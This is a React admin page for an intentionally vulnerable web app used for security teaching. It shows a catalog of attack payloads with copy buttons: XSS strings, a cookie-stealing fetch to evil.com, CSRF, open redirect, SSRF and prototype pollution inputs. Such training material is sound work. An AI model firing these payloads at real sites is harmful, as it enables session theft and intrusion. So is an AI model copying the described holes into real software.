import { useState, useEffect } from 'react';
import { Card, Button, Table, message, Input, Select, Collapse, Tag, Space, Alert } from 'antd';
import { BugOutlined, DeleteOutlined, ReloadOutlined, CodeOutlined } from '@ant-design/icons';
import { Layout } from '@/components/Layout';
import { adminService } from '@/services/admin';
import type { DemoLog } from '@/services/types';

const { TextArea } = Input;
const { Option } = Select;
const { Panel } = Collapse;

const DemoControl = () => {
  const [logs, setLogs] = useState<DemoLog[]>([]);
  const [loading, setLoading] = useState(false);
  const [logType, setLogType] = useState<string>('');
  const [logDescription, setLogDescription] = useState('');
  const [logPayload, setLogPayload] = useState('');

  const loadLogs = async () => {
    setLoading(true);
    try {
      const data = await adminService.getLogs(undefined, 100);
      setLogs(data.logs);
    } catch (error) {
      message.error('Failed to load logs');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadLogs();
  }, []);

  const handleAddLog = async () => {
    if (!logType || !logDescription) {
      message.warning('Please fill in type and description');
      return;
    }

    try {
      await adminService.addLog(logType, logDescription, logPayload);
      message.success('Log added');
      setLogType('');
      setLogDescription('');
      setLogPayload('');
      loadLogs();
    } catch (error) {
      message.error('Failed to add log');
    }
  };

  const handleClearLogs = async () => {
    try {
      await adminService.clearLogs();
      message.success('All logs cleared');
      loadLogs();
    } catch (error) {
      message.error('Failed to clear logs');
    }
  };

  const handleResetDemo = async () => {
    try {
      await adminService.resetDemo();
      message.success('Demo data reset successfully');
      loadLogs();
    } catch (error) {
      message.error('Failed to reset demo data');
    }
  };

  const logColumns = [
    {
      title: 'Type',
      dataIndex: 'type',
      key: 'type',
      render: (type: string) => {
        const colors: any = {
          'XSS': 'red',
          'CSRF': 'orange',
          'SSRF': 'purple',
          'SQLi': 'volcano',
          'OpenRedirect': 'magenta',
          'PrototypePollution': 'geekblue',
        };
        return <Tag color={colors[type] || 'blue'}>{type}</Tag>;
      },
    },
    {
      title: 'Description',
      dataIndex: 'description',
      key: 'description',
    },
    {
      title: 'Payload',
      dataIndex: 'payload',
      key: 'payload',
      render: (payload: string) => payload ? (
        <code style={{ fontSize: '11px', background: '#f5f5f5', padding: '2px 6px', borderRadius: '4px' }}>
          {payload.substring(0, 50)}{payload.length > 50 && '...'}
        </code>
      ) : '-',
    },
    {
      title: 'Time',
      dataIndex: 'created_at',
      key: 'created_at',
      render: (date: string) => new Date(date).toLocaleTimeString(),
    },
  ];

  const vulnerabilityExamples = [
    {
      name: 'Reflected XSS (Search)',
      type: 'XSS',
      description: 'Search query reflected without sanitization',
      payload: '<img src=x onerror=alert("XSS")>',
      location: 'Home page search box',
      severity: 'High',
    },
    {
      name: 'Stored XSS (Comments)',
      type: 'XSS',
      description: 'Comments stored and displayed without sanitization',
      payload: '<script>alert("Stored XSS")</script>',
      location: 'Post detail page comments',
      severity: 'Critical',
    },
    {
      name: 'DOM-based XSS (Profile Bio)',
      type: 'XSS',
      description: 'Bio field rendered with dangerouslySetInnerHTML',
      payload: '<img src=x onerror=fetch("http://evil.com?cookie="+document.cookie)>',
      location: 'User profile page',
      severity: 'High',
    },
    {
      name: 'CSRF (Delete Post)',
      type: 'CSRF',
      description: 'No CSRF token validation on DELETE endpoints',
      payload: '<img src="http://localhost:3000/api/posts/1" style="display:none">',
      location: 'Any DELETE operation',
      severity: 'Medium',
    },
    {
      name: 'Open Redirect',
      type: 'OpenRedirect',
      description: 'Redirect endpoint accepts any URL',
      payload: 'http://localhost:3000/api/redirect?url=http://evil.com',
      location: '/api/redirect',
      severity: 'Medium',
    },
    {
      name: 'SSRF (URL Preview)',
      type: 'SSRF',
      description: 'Server-side request to user-controlled URL',
      payload: '{"url":"http://localhost:3000/api/debug/config"}',
      location: '/api/preview',
      severity: 'High',
    },
    {
      name: 'Prototype Pollution',
      type: 'PrototypePollution',
      description: 'Vulnerable lodash@4.17.11 merge',
      payload: '{"__proto__":{"isAdmin":true}}',
      location: '/api/settings/merge',
      severity: 'Critical',
    },
    {
      name: 'Data Exposure',
      type: 'DataExposure',
      description: 'Debug endpoint exposes sensitive config',
      payload: 'GET /api/debug/config',
      location: '/api/debug/config',
      severity: 'Critical',
    },
  ];

  return (
    <Layout>
      <div style={{ width: '100%' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 24 }}>
          <h1><BugOutlined /> Security Demo Control Panel</h1>
          <Space>
            <Button icon={<ReloadOutlined />} onClick={loadLogs}>
              Refresh Logs
            </Button>
            <Button icon={<DeleteOutlined />} onClick={handleClearLogs}>
              Clear Logs
            </Button>
            <Button danger icon={<ReloadOutlined />} onClick={handleResetDemo}>
              Reset Demo Data
            </Button>
          </Space>
        </div>

        <Alert
          message="⚠️ Warning: This application is intentionally vulnerable"
          description="This demo app contains real security vulnerabilities for educational purposes. Do NOT use this code in production!"
          type="warning"
          showIcon
          style={{ marginBottom: 24 }}
        />

        <Card title="Vulnerability Catalog" style={{ marginBottom: 24 }}>
          <Collapse>
            {vulnerabilityExamples.map((vuln, index) => (
              <Panel
                header={
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span>
                      <Tag color={vuln.severity === 'Critical' ? 'red' : vuln.severity === 'High' ? 'orange' : 'yellow'}>
                        {vuln.severity}
                      </Tag>
                      {vuln.name}
                    </span>
                    <Tag>{vuln.type}</Tag>
                  </div>
                }
                key={index}
              >
                <div style={{ marginBottom: 12 }}>
                  <strong>Description:</strong> {vuln.description}
                </div>
                <div style={{ marginBottom: 12 }}>
                  <strong>Location:</strong> <code>{vuln.location}</code>
                </div>
                <div>
                  <strong>Payload:</strong>
                  <TextArea
                    value={vuln.payload}
                    readOnly
                    autoSize
                    style={{ marginTop: 8, fontFamily: 'monospace', fontSize: '12px' }}
                  />
                  <Button
                    size="small"
                    style={{ marginTop: 8 }}
                    onClick={() => {
                      navigator.clipboard.writeText(vuln.payload);
                      message.success('Payload copied to clipboard!');
                    }}
                  >
                    Copy Payload
                  </Button>
                </div>
              </Panel>
            ))}
          </Collapse>
        </Card>

        <Card title="Add Demo Log" style={{ marginBottom: 24 }}>
          <Space direction="vertical" style={{ width: '100%' }}>
            <Select
              style={{ width: '100%' }}
              placeholder="Select vulnerability type"
              value={logType}
              onChange={setLogType}
            >
              <Option value="XSS">XSS</Option>
              <Option value="CSRF">CSRF</Option>
              <Option value="SSRF">SSRF</Option>
              <Option value="SQLi">SQL Injection</Option>
              <Option value="OpenRedirect">Open Redirect</Option>
              <Option value="PrototypePollution">Prototype Pollution</Option>
              <Option value="DataExposure">Data Exposure</Option>
            </Select>
            <Input
              placeholder="Description (e.g., 'XSS attack detected in search')"
              value={logDescription}
              onChange={(e) => setLogDescription(e.target.value)}
            />
            <TextArea
              placeholder="Payload (optional)"
              value={logPayload}
              onChange={(e) => setLogPayload(e.target.value)}
              rows={3}
            />
            <Button type="primary" icon={<CodeOutlined />} onClick={handleAddLog}>
              Add Log Entry
            </Button>
          </Space>
        </Card>

        <Card title="Demo Activity Logs">
          <Table
            dataSource={logs}
            columns={logColumns}
            rowKey="id"
            loading={loading}
            pagination={{ pageSize: 20 }}
          />
        </Card>
      </div>
    </Layout>
  );
};

export default DemoControl;
